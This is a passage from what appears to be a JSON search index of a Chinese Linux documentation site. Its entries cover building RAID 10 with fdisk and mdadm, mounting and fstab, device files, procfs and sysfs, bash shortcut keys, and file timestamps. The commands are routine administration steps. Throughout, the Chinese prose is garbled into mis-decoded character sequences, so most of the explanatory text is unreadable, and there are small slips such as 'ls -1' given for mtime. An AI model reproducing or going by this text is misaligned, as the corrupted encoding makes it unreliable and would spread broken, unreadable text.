/dev/sdc, /dev/sdd å’Œ /dev/sde)åˆ›å»ºæ–°åˆ†åŒº: fdisk /dev/sdb fdisk /dev/sdc fdisk /dev/sdd fdisk /dev/sde ä¸º /dev/sdb åˆ›å»ºåˆ†åŒº, æˆ‘æ¥å‘Šè¯‰ä½ å¦‚ä½•ä½¿ç”¨ fdisk ä¸ºç£ç›˜(/dev/sdb)è¿›è¡Œåˆ†åŒºï¼Œæ­¤æ­¥ä¹Ÿé€‚ç”¨äºå…¶ä»–ç£ç›˜: fdisk /dev/sdb è¯·ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ä¸º /dev/sdb åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†åŒºã€‚ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚ åªéœ€æŒ‰ä¸¤æ¬¡å›è½¦é”®é€‰æ‹©é»˜è®¤å€¼å³å¯ã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ‰“å°åˆ›å»ºå¥½çš„åˆ†åŒºã€‚ æŒ‰ L ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t å»ä¿®æ”¹åˆ†åŒºã€‚ é”®å…¥ fd è®¾ç½®ä¸º Linux çš„ RAID ç±»å‹ï¼Œç„¶åæŒ‰ Enter ç¡®è®¤ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ ä¸ºç£ç›˜ sdb åˆ†åŒº æ³¨è§£ è¯·ä½¿ç”¨ä¸Šé¢ç›¸åŒçš„æŒ‡ä»¤å¯¹å…¶ä»–ç£ç›˜(sdc, sdd sdd sde)è¿›è¡Œåˆ†åŒºã€‚ åˆ›å»ºå¥½4ä¸ªåˆ†åŒºåï¼Œéœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æ£€æŸ¥ç£ç›˜æ˜¯å¦å­˜åœ¨ raid: mdadm -E /dev/sd[b-e] # mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### æˆ– mdadm -E /dev/sd[b-e]1 # mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### æˆ– æ£€æŸ¥ç£ç›˜ æ³¨è§£ ä»¥ä¸Šè¾“å‡ºæ˜¾ç¤ºï¼Œæ–°åˆ›å»ºçš„å››ä¸ªåˆ†åŒºä¸­æ²¡æœ‰æ£€æµ‹åˆ° super-blockï¼Œ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç»§ç»­åœ¨è¿™äº›ç£ç›˜ä¸Šåˆ›å»º RAID 10ã€‚ ç¬¬2æ­¥: åˆ›å»º RAID è®¾å¤‡ md ç°åœ¨è¯¥åˆ›å»ºä¸€ä¸ª`md`ï¼ˆå³ /dev/md0ï¼‰è®¾å¤‡äº†ï¼Œä½¿ç”¨\"mdadm\" raid ç®¡ç†å·¥å…·ã€‚ åœ¨åˆ›å»ºè®¾å¤‡ä¹‹å‰ï¼Œå¿…é¡»ç¡®ä¿ç³»ç»Ÿå·²ç»å®‰è£…äº†`mdadm`å·¥å…·ï¼Œå¦‚æœæ²¡æœ‰è¯·ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥å®‰è£…: yum install mdadm [åœ¨ RedHat ç³»ç»Ÿ]### apt-get install mdadm [åœ¨ Debain ç³»ç»Ÿ] mdadm`å·¥å…·å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ª `md raid è®¾å¤‡: mdadm --create /dev/md0 --level=10 --raid-devices=4 /dev/sd[b-e]1 æ¥ä¸‹æ¥ä½¿ç”¨ cat å‘½ä»¤éªŒè¯æ–°åˆ›å»ºçš„ raid è®¾å¤‡: cat /proc/mdstat åˆ›å»º md RAID è®¾å¤‡ æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æ£€æŸ¥4ä¸ªç£ç›˜ã€‚ä¸‹é¢å‘½ä»¤çš„è¾“å‡ºä¼šå¾ˆé•¿ï¼Œå› ä¸ºå®ƒä¼šæ˜¾ç¤º4ä¸ªç£ç›˜çš„æ‰€æœ‰ä¿¡æ¯: mdadm --examine /dev/sd[b-e]1 æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹ RAID é˜µåˆ—çš„è¯¦ç»†ä¿¡æ¯: mdadm --detail /dev/md0 æŸ¥çœ‹ RAID é˜µåˆ—è¯¦ç»†ä¿¡æ¯ æ³¨è§£ ä½ åœ¨ä¸Šé¢çœ‹åˆ°çš„ç»“æœï¼Œè¯¥ RAID çš„çŠ¶æ€æ˜¯ active å’Œre-syncingã€‚ ç¬¬3æ­¥ï¼šåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ ä½¿ç”¨ ext4 ä½œä¸º md0 çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å°†å®ƒæŒ‚è½½åˆ° /mnt/raid10 ä¸‹ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ç”¨çš„æ˜¯ ext4ï¼Œä½ å¯ä»¥ä½¿ç”¨ä½ æƒ³è¦çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹: mkfs.ext4 /dev/md0 åˆ›å»º md æ–‡ä»¶ç³»ç»Ÿ åœ¨åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿåï¼ŒæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿåˆ° /mnt/raid10 ä¸‹ï¼Œå¹¶ä½¿ç”¨ ls -l å‘½ä»¤åˆ—å‡ºæŒ‚è½½ç‚¹ä¸‹çš„å†…å®¹: mkdir /mnt/raid10 mount /dev/md0 /mnt/raid10/ ls -l /mnt/raid10/ æ¥ä¸‹æ¥ï¼Œåœ¨æŒ‚è½½ç‚¹ä¸‹åˆ›å»ºä¸€äº›æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ·»åŠ äº›å†…å®¹ï¼Œç„¶åæ£€æŸ¥å†…å®¹: touch /mnt/raid10/raid10_files.txt ls -l /mnt/raid10/ echo \"raid 10 setup with 4 disks\" > /mnt/raid10/raid10_files.txt cat /mnt/raid10/raid10_files.txt æŒ‚è½½ md è®¾å¤‡ è¦æƒ³è‡ªåŠ¨æŒ‚è½½ï¼Œæ‰“å¼€`/etc/fstab`æ–‡ä»¶å¹¶æ·»åŠ ä¸‹é¢çš„æ¡ç›®ï¼ŒæŒ‚è½½ç‚¹æ ¹æ®ä½ ç¯å¢ƒçš„ä¸åŒæ¥æ·»åŠ ã€‚ä½¿ç”¨ wq! ä¿å­˜å¹¶é€€å‡º: vim /etc/fstab/dev/md0 /mnt/raid10 ext4 defaults 0 0 æŒ‚è½½ md è®¾å¤‡ æ¥ä¸‹æ¥ï¼Œåœ¨é‡æ–°å¯åŠ¨ç³»ç»Ÿå‰ä½¿ç”¨`mount -a`æ¥ç¡®è®¤`/etc/fstab`æ–‡ä»¶æ˜¯å¦æœ‰é”™è¯¯: mount -av æ£€æŸ¥ Fstab ä¸­çš„é”™è¯¯ ç¬¬å››æ­¥ï¼šä¿å­˜ RAID é…ç½® é»˜è®¤æƒ…å†µä¸‹ RAID æ²¡æœ‰é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸Šè¿°æ­¥éª¤å®Œæˆåæ‰‹åŠ¨ä¿å­˜å®ƒ: mdadm --detail --scan --verbose >> /etc/mdadm.conf ä¿å­˜ RAID10 çš„é…ç½® å°±è¿™æ ·ï¼Œæˆ‘ä»¬ä½¿ç”¨æ–¹æ³•1åˆ›å»ºå®Œäº† RAID 10ï¼Œè¿™ç§æ–¹æ³•æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨æ–¹æ³•2æ¥è®¾ç½® RAID 10ã€‚ æ–¹æ³•2ï¼šåˆ›å»º RAID 10 åœ¨æ–¹æ³•2ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»å®šä¹‰2ç»„ RAID 1ï¼Œç„¶åæˆ‘ä»¬éœ€è¦ä½¿ç”¨è¿™äº›åˆ›å»ºå¥½çš„ RAID 1 çš„é›†åˆæ¥å®šä¹‰ä¸€ä¸ª RAID 0ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†è¦åšçš„æ˜¯å…ˆåˆ›å»º2ä¸ªé•œåƒï¼ˆRAID1ï¼‰ï¼Œç„¶ååˆ›å»º RAID0 ï¼ˆæ¡å¸¦åŒ–ï¼‰ã€‚ é¦–å…ˆï¼Œåˆ—å‡ºæ‰€æœ‰çš„å¯ç”¨äºåˆ›å»º RAID 10 çš„ç£ç›˜: ls -l /dev | grep sd åˆ—å‡ºäº† 4 ä¸ªè®¾å¤‡ å°†4ä¸ªç£ç›˜ä½¿ç”¨ fdisk å‘½ä»¤è¿›è¡Œåˆ†åŒºã€‚å¯¹äºå¦‚ä½•åˆ†åŒºï¼Œæ‚¨å¯ä»¥æŒ‰ç…§ä¸Šé¢çš„ç¬¬1æ­¥: fdisk /dev/sdb### fdisk /dev/sdc### fdisk /dev/sdd### fdisk /dev/sde åœ¨å®Œæˆ4ä¸ªç£ç›˜çš„åˆ†åŒºåï¼Œç°åœ¨æ£€æŸ¥ç£ç›˜æ˜¯å¦å­˜åœ¨ RAIDå—: mdadm --examine /dev/sd[b-e] mdadm --examine /dev/sd[b-e]1 æ£€æŸ¥ 4 ä¸ªç£ç›˜ ç¬¬1æ­¥ï¼šåˆ›å»º RAID 1 é¦–å…ˆï¼Œä½¿ç”¨4å—ç£ç›˜åˆ›å»º2ç»„ RAID 1ï¼Œä¸€ç»„ä¸º sdb1 å’Œ sdc1 ï¼Œå¦ä¸€ç»„æ˜¯ sdd1 å’Œ sde1 mdadm --create /dev/md1 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[b-c]1 mdadm --create /dev/md2 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[d-e]1 cat /proc/mdstat åˆ›å»º RAID 1 æŸ¥çœ‹ RAID 1 çš„è¯¦ç»†ä¿¡æ¯ ç¬¬2æ­¥ï¼šåˆ›å»º RAID 0 æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ md1 å’Œ md2 æ¥åˆ›å»º RAID 0: mdadm --create /dev/md0 --level=0 --raid-devices=2 /dev/md1 /dev/md2 cat /proc/mdstat åˆ›å»º RAID 0 ç¬¬3æ­¥ï¼šä¿å­˜ RAID é…ç½® æˆ‘ä»¬éœ€è¦å°†é…ç½®æ–‡ä»¶ä¿å­˜åœ¨ /etc/mdadm.conf æ–‡ä»¶ä¸­ï¼Œä½¿å…¶æ¯æ¬¡é‡æ–°å¯åŠ¨åéƒ½èƒ½åŠ è½½æ‰€æœ‰çš„ RAID è®¾å¤‡: mdadm --detail --scan --verbose >> /etc/mdadm.conf åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æŒ‰ç…§æ–¹æ³•1ä¸­çš„ç¬¬3æ­¥æ¥åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿã€‚ å°±æ˜¯è¿™æ ·ï¼æˆ‘ä»¬é‡‡ç”¨çš„æ–¹æ³•2åˆ›å»ºå®Œäº† RAID 1+0ã€‚æˆ‘ä»¬å°†ä¼šå¤±å»ä¸€åŠçš„ç£ç›˜ç©ºé—´ï¼Œä½†ç›¸æ¯”å…¶ä»– RAID ï¼Œå®ƒçš„æ€§èƒ½å°†æ˜¯éå¸¸å¥½çš„ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html"},{"title":"ç±» Unix æ–‡ä»¶ç³»ç»Ÿ","text":"åœ¨GNU/Linuxå’Œå…¶ä»– ç±»Unix æ“ä½œç³»ç»Ÿä¸­ï¼Œ æ–‡ä»¶ è¢«ç»„ç»‡åˆ° ç›®å½• ä¸­ã€‚ æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•æ’æ”¾åœ¨ä»¥ \" / \" ä¸ºæ ¹çš„å·¨å¤§çš„æ ‘é‡Œã€‚ å«å®ƒæ ‘æ˜¯å› ä¸ºå¦‚æœä½ ç”»å‡ºæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒçœ‹èµ·æ¥å°±åƒä¸€æ£µæ ‘ï¼Œä½†æ˜¯å®ƒæ˜¯é¢ å€’è¿‡æ¥çš„ã€‚ è¿™äº›æ–‡ä»¶å’Œç›®å½•å¯ä»¥åˆ†æ•£åœ¨å¤šä¸ªè®¾å¤‡ä¸­ã€‚ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/mount ç”¨äºæŠŠæŸä¸ªè®¾å¤‡ä¸Šæ‰¾åˆ°çš„æ–‡ä»¶ç³»ç»Ÿé™„ç€åˆ°å·¨å¤§çš„æ–‡ä»¶æ ‘ä¸Šã€‚ ç›¸åçš„ï¼Œ umount æŠŠå®ƒå†æ¬¡åˆ†ç¦»ã€‚ åœ¨æœ€è¿‘çš„ Linux å†…æ ¸é‡Œï¼Œ mount å¸¦æŸäº›å‚æ•°æ—¶å¯ä»¥æŠŠæ–‡ä»¶æ ‘çš„ä¸€éƒ¨åˆ†ç»‘å®šåˆ°å¦å¤–çš„åœ°æ–¹ï¼Œ æˆ–è€…å¯ä»¥æŠŠæ–‡ä»¶ç³»ç»ŸæŒ‚è½½ä¸ºå…±äº«çš„ã€ç§æœ‰çš„ã€ä»è®¾å¤‡ã€æˆ–ä¸å¯ç»‘å®šçš„ã€‚ å¯¹æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿæ”¯æŒçš„æŒ‚è½½é€‰é¡¹å¯ä»¥åœ¨ /usr/share/doc/linux-doc-*/Documentation/filesystems/ æ‰¾åˆ°ã€‚ Unixç³»ç»Ÿä¸Šå«åš ç›®å½• ï¼Œ æŸäº›å…¶ä»–ç³»ç»Ÿä¸Šå«åš æ–‡ä»¶å¤¹ ã€‚ è¯·åŒæ ·ç•™æ„ï¼Œåœ¨ä»»ä½•Unixç³»ç»Ÿä¸Šï¼Œæ²¡æœ‰çš„ é©±åŠ¨å™¨ çš„æ¦‚å¿µï¼Œ ä¾‹å¦‚ \" A: \" ã€‚ è¿™åªæœ‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”æ‰€æœ‰ä¸œè¥¿éƒ½åŒ…å«åœ¨å†…ã€‚ è¿™ç›¸å¯¹äº Windows æ¥è¯´æ˜¯ä¸€ä¸ªå·¨å¤§çš„ä¼˜ç‚¹ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html"},{"title":"è®¾å¤‡æ–‡ä»¶","text":"è®¾å¤‡æ–‡ä»¶ åŒ…æ‹¬ç³»ç»Ÿçš„ç‰©ç†è®¾å¤‡å’Œè™šæ‹Ÿè®¾å¤‡ï¼Œå¦‚ç¡¬ç›˜ã€æ˜¾å¡ã€æ˜¾ç¤ºå±ã€é”®ç›˜ã€‚ è™šæ‹Ÿè®¾å¤‡çš„ä¸€ä¸ªä¾‹å­æ˜¯æ§åˆ¶å°ï¼Œç”¨\" /dev/console \"æ¥æè¿°ã€‚ è®¾å¤‡æ–‡ä»¶æœ‰ä¸¤ç§ç±»å‹ã€‚ å­—ç¬¦è®¾å¤‡ æ¯æ¬¡è®¿é—®ä¸€ä¸ªå­—ç¬¦ ä¸€ä¸ªå­—ç¬¦ç­‰äºä¸€ä¸ªå­—èŠ‚ å¦‚é”®ç›˜ã€ä¸²å£â€¦ å—è®¾å¤‡ é€šè¿‡æ›´å¤§çš„å•å…ƒâ€“å—ï¼Œè¿›è¡Œè®¿é—® ä¸€ä¸ªå—>ä¸€ä¸ªå­—èŠ‚ å¦‚ç¡¬ç›˜ç­‰â€¦ ä½ å¯ä»¥è¯»å†™å—è®¾å¤‡æ–‡ä»¶ï¼Œå°½ç®¡è¯¥æ–‡ä»¶å¯èƒ½åŒ…å«äºŒè¿›åˆ¶æ•°æ®ï¼Œ è¯»å–åæ˜¾ç¤ºå‡ºæ— æ³•ç†è§£çš„ä¹±ç ã€‚ å‘æ–‡ä»¶å†™å…¥æ•°æ®ï¼Œæœ‰æ—¶å¯ä»¥å¸®åŠ©å®šä½ç¡¬ä»¶è¿æ¥æ•…éšœã€‚ æ¯”å¦‚ï¼Œä½ å¯ä»¥å°†æ–‡æœ¬æ–‡ä»¶å¯¼å…¥æ‰“å°æœºè®¾å¤‡\" /dev/lp0 \"ï¼Œ æˆ–è€…å°†è°ƒåˆ¶è§£è°ƒå‘½ä»¤å‘é€åˆ°åˆé€‚çš„ä¸²å£\" /dev/ttyS0 \"ã€‚ ä½†æ˜¯ï¼Œé™¤éè¿™äº›æ“ä½œéƒ½å°å¿ƒå®Œæˆï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´ä¸€åœºå¤§ç¾éš¾ã€‚æ‰€ä»¥è¦ç‰¹åˆ«å°å¿ƒã€‚ æ³¨è§£ å¸¸è§„è®¿é—®æ‰“å°æœºï¼Œä½¿ç”¨ lp è®¾å¤‡çš„èŠ‚ç‚¹æ•°å¯ä»¥é€šè¿‡æ‰§è¡Œ ls å¾—åˆ°ï¼Œå¦‚ä¸‹æ‰€ç¤º: $ ls -l /dev/sda /dev/sr0 /dev/ttyS0 /dev/zero brw-rw---T 1 root disk 8, 0 Oct 16 20:57 /dev/sda brw-rw---T+ 1 root cdrom 11, 0 Oct 16 21:53 /dev/sr0 crw-rw---T 1 root dialout 4, 64 Oct 16 20:57 /dev/ttyS0 crw-rw-rw- 1 root root 1, 5 Oct 16 20:57 /dev/zero /dev/sda çš„ä¸»è®¾å¤‡å·æ˜¯8ï¼Œæ¬¡è®¾å¤‡å·æ˜¯0ã€‚å®ƒå¯ä»¥è¢« disk ç¾¤ç»„çš„ç”¨æˆ·è¯»å†™ã€‚ /dev/sr0 çš„ä¸»è®¾å¤‡å·æ˜¯11ï¼Œæ¬¡è®¾å¤‡å·æ˜¯0ã€‚å®ƒå¯ä»¥è¢« cdrom ç¾¤ç»„çš„ç”¨æˆ·è¯»å†™ã€‚ /dev/ttyS0 çš„ä¸»è®¾å¤‡å·æ˜¯4ï¼Œæ¬¡è®¾å¤‡å·æ˜¯64ã€‚å®ƒå¯ä»¥è¢« dailout ç¾¤ç»„çš„ç”¨æˆ·è¯»å†™ã€‚ /dev/zero çš„ä¸»è®¾å¤‡å·æ˜¯1ï¼Œæ¬¡è®¾å¤‡å·æ˜¯5ã€‚å®ƒå¯ä»¥è¢«ä»»æ„ç”¨æˆ·è¯»å†™ã€‚ åœ¨ç°ä»£Linuxç³»ç»Ÿä¸­ï¼Œå¤„åœ¨ /dev ä¹‹ä¸‹çš„æ–‡ä»¶ç³»ç»Ÿä¼šè‡ªåŠ¨è¢« udev æœºåˆ¶å¡«å……ã€‚ ç‰¹æ®Šè®¾å¤‡æ–‡ä»¶ è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„è®¾å¤‡æ–‡ä»¶ã€‚ ç‰¹æ®Šè®¾å¤‡æ–‡ä»¶åˆ—è¡¨ è®¾å¤‡æ–‡ä»¶ æ“ä½œ å“åº”æè¿° /dev/null è¯»å– è¿”å› æ–‡ä»¶ç»“å°¾å­—ç¬¦ï¼ˆEOFï¼‰ /dev/null å†™å…¥ æ— è¿”å›ï¼ˆä¸€ä¸ªæ— åº•çš„æ•°æ®è½¬å­˜æ·±æ¸Šï¼‰ /dev/zero è¯»å– è¿”å› 0 ç©ºç¬¦ï¼ˆä¸ASCIIä¸­çš„æ•°å­—0ä¸åŒï¼‰ /dev/random è¯»å– ä»çœŸéšæœºæ•°äº§ç”Ÿå™¨è¿”å›ä¸€ä¸ªéšæœºå­—ç¬¦ï¼Œä¾›åº”çœŸç†µï¼ˆç¼“æ…¢ï¼‰ /dev/urandom è¯»å– ä»èƒ½å¤Ÿå®‰å…¨åŠ å¯†çš„ä¼ªéšæœºæ•°äº§ç”Ÿå™¨è¿”å›ä¸€ä¸ªéšæœºå­—ç¬¦ /dev/full å†™å…¥ è¿”å›ç£ç›˜å·²æ»¡ï¼ˆENOSPCï¼‰é”™è¯¯ è¿™äº›ç‰¹åˆ«è®¾å¤‡æ–‡ä»¶ç»å¸¸å’Œ shell æ•°æ®é‡å®šå‘è”åˆä½¿ç”¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html"},{"title":"procfs å’Œ sysfs","text":"procfs å’Œ sysfs ä¸¤ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œ åˆ†åˆ«åŠ è½½äº /proc å’Œ /sys ä¹‹ä¸Šï¼Œ å°†å†…æ ¸ä¸­çš„æ•°æ®ç»“æ„æš´éœ²ç»™ç”¨æˆ·ç©ºé—´ã€‚ æˆ–è€…è¯´ï¼Œè¿™äº›æ¡ç›®æ˜¯è™šæ‹Ÿçš„ï¼Œä»–ä»¬æ‰“å¼€äº†æ·±å…¥äº†è§£æ“ä½œç³»ç»Ÿè¿è¡Œçš„æ–¹ä¾¿ä¹‹é—¨ã€‚ ç›®å½• /proc ä¸ºæ¯ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æä¾›äº†ä¸€ä¸ªå­ç›®å½•ï¼Œ ç›®å½•çš„åå­—å°±æ˜¯è¿›ç¨‹æ ‡è¯†ç¬¦ï¼ˆPIDï¼‰ã€‚ éœ€è¦è¯»å–è¿›ç¨‹ä¿¡æ¯çš„ç³»ç»Ÿå·¥å…·ï¼Œå¦‚ ps ï¼Œå¯ä»¥ä»è¿™ä¸ªç›®å½•ç»“æ„è·å¾—ä¿¡æ¯ã€‚ /proc/sys ä¹‹ä¸‹çš„ç›®å½•ï¼Œ åŒ…å«äº†å¯ä»¥æ›´æ”¹æŸäº›å†…æ ¸è¿è¡Œå‚æ•°çš„æ¥å£ã€‚ ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„ sysctl () å‘½ä»¤ä¿®æ”¹ï¼Œæˆ–è€…ä½¿ç”¨å…¶é¢„åŠ è½½/é…ç½®æ–‡ä»¶ /etc/sysctl.conf ï¼‰ å½“äººä»¬çœ‹åˆ°è¿™ä¸ªç‰¹åˆ«å¤§çš„æ–‡ä»¶ /proc/kcore æ—¶ï¼Œå¸¸å¸¸ä¼šæƒŠæ…Œå¤±æªã€‚ è¿™ä¸ªæ–‡ä»¶äºä½ çš„çš„ç”µè„‘å†…å­˜å¤§å°ç›¸å·®ä¸å¤šã€‚ å®ƒè¢«ç”¨æ¥è°ƒè¯•å†…æ ¸ã€‚å®ƒæ˜¯ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ï¼ŒæŒ‡å‘ç³»ç»Ÿå†…å­˜ï¼Œæ‰€ä»¥ä¸å¿…æ‹…å¿ƒå®ƒçš„å¤§å°ã€‚ /sys ä»¥ä¸‹çš„ç›®å½•åŒ…å«äº†å†…æ ¸è¾“å‡ºçš„æ•°æ®ç»“æ„ï¼Œå®ƒä»¬çš„å±æ€§ï¼Œä»¥åŠå®ƒä»¬ä¹‹é—´çš„é“¾æ¥ã€‚ å®ƒåŒæ—¶ä¹ŸåŒ…å«äº†æ”¹å˜æŸäº›å†…æ ¸è¿è¡Œæ—¶å‚æ•°çš„æ¥å£ã€‚ å‚è€ƒ: proc.txt(.gz) sysfs.txt(.gz) ä»¥åŠå…¶ä»–ç›¸å…³çš„Linuxå†…æ ¸æ–‡æ¡£ /usr/share/doc/linux-doc-*/Documentation/filesystems/* è¿™äº›æ–‡ä»¶ç”± `linux-doc-*` è½¯ä»¶åŒ…æä¾›ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html"},{"title":"ç‰¹æ®ŠæŒ‰é”®","text":"åœ¨ ç±»Unix ç¯å¢ƒï¼Œ æœ‰ä¸€äº›å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„æŒ‰é”®ã€‚ è¯·æ³¨æ„ï¼Œæ™®é€šçš„Linuxå­—ç¬¦æ§åˆ¶å°ï¼Œåªæœ‰å·¦æ‰‹è¾¹çš„ Ctrl å’Œ Alt é”®å¯ä»¥æ­£å¸¸å·¥ä½œã€‚å…¶ä¸­æœ‰å‡ ä¸ªå€¼å¾—è®°ä½çš„æŒ‰é”®ã€‚ bash çš„æŒ‰é”®ç»‘å®šåˆ—è¡¨ å¿«æ·é”® å¿«æ·é”®æè¿° Ctrl-U åˆ é™¤å…‰æ ‡å‰åˆ°è¡Œé¦–çš„å­—ç¬¦ Ctrl-H åˆ é™¤å…‰æ ‡å‰çš„ä¸€ä¸ªå­—ç¬¦ Ctrl-D ç»ˆæ­¢è¾“å…¥ï¼ˆå¦‚æœä½ åœ¨ä½¿ç”¨ shellï¼Œåˆ™é€€å‡º shellï¼‰ Ctrl-C ç»ˆæ­¢ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åº Ctrl-Z é€šè¿‡å°†ç¨‹åºç§»åŠ¨åˆ°åå°æ¥æš‚åœç¨‹åº Ctrl-S åœæ­¢å±å¹•è¾“å‡º Ctrl-Q æ¿€æ´»å±å¹•è¾“å‡º Ctrl-Alt-Del é‡å¯/å…³é—­ç³»ç»Ÿï¼Œå‚è§ inittab å·¦ Alt é”® (å¯é€‰æ‹©åŒæ—¶æŒ‰ä¸‹ Windows-key ) Emacs å’Œç›¸ä¼¼ UI çš„å…ƒé”®ï¼ˆmeta-keyï¼‰ Up-arrow å‘ä¸Šæ–¹å‘é”® å¼€å§‹åœ¨ bash ä¸­æŸ¥çœ‹å‘½ä»¤å†å² Ctrl-R å¼€å§‹åœ¨ bash çš„å¢é‡å‘½ä»¤å†å²ä¸­æœç´¢ Tab åœ¨ bash å‘½ä»¤è¡Œä¸­è¡¥å…¨æ–‡ä»¶å è·Ÿ /docs/æ“ä½œç³»ç»Ÿ/linux/æ•™ç¨‹/å¿«æ·é”® åŸºæœ¬ä¸€è‡´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html"},{"title":"GNU/Linux æ–‡ä»¶æœ‰ä¸‰ç§ç±»å‹çš„æ—¶é—´æˆ³","text":"æ—¶é—´æˆ³ç±»å‹åˆ—è¡¨ ç±»å‹ å«ä¹‰ï¼ˆå†å²ä¸Š Unix çš„å®šä¹‰ï¼‰ mtime æ–‡ä»¶ä¿®æ”¹æ—¶é—´( ls -1 ) ctime æ–‡ä»¶çŠ¶æ€ä¿®æ”¹æ—¶é—´ ( ls -lc ) atime æ–‡ä»¶æœ€åè¢«è®¿é—®çš„æ—¶é—´ ( ls -lu ) æ³¨æ„ ctime ä¸æ˜¯æ–‡ä»¶åˆ›å»ºæ—¶é—´ã€‚ æ³¨æ„ atime åœ¨ GNU/Linux ç³»ç»Ÿä¸Šçš„çœŸå®å€¼å¯èƒ½å’Œå†å²ä¸Š Unix çš„å®šä¹‰æœ‰æ‰€ä¸åŒã€‚ è¦†ç›– ä¸€ä¸ªæ–‡ä»¶ï¼Œå°†ä¼šæ”¹å˜è¯¥æ–‡ä»¶æ‰€æœ‰çš„ mtime , ctime , å’Œ atime å±æ€§ã€‚ æ”¹å˜æ–‡ä»¶çš„ æ‰€æœ‰è€…æˆ–è€…æƒé™ ï¼Œå°†æ”¹å˜æ–‡ä»¶çš„ ctime å’Œ atime å±æ€§ã€‚ åœ¨å†å²ä¸Šçš„ Unix ç³»ç»Ÿä¸­ï¼Œè¯»å–ä¸€ä¸ªæ–‡ä»¶å°†æ”¹å˜æ–‡ä»¶çš„ atime å±æ€§ã€‚ è¯»ä¸€ä¸ªæ–‡ä»¶ï¼Œå°†æ”¹å˜æ–‡ä»¶çš„ atime å±æ€§ï¼› åœ¨ GNU/Linux ç³»ç»Ÿä¸Šï¼Œè¿™ä»…å‘ç”Ÿåœ¨å…¶æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨\" strictatime \"å‚æ•°æŒ‚è½½çš„æƒ…å†µä¸‹ã€‚ å¦‚æœ GNU/Linux ç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨ \" relatime \" é€‰é¡¹æŒ‚è½½ï¼Œ ç¬¬ä¸€æ¬¡è¯»æ–‡ä»¶ï¼Œæˆ–è€…éšåè¯»æ–‡ä»¶ï¼Œå°†æ”¹å˜è¯¥æ–‡ä»¶çš„ atime å±æ€§. (ä» Linux 